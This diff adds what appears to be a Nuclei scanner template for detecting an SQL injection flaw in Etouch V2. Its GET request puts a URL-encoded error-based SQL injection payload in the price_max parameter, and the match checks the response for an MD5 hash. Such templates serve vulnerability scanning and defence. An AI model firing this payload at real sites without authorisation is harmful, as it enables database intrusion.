@@ -1,0 +1,20 @@
+id: poc-yaml-etouch-v2-sqli
+info:
+  name: Etouch V2 SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849b"
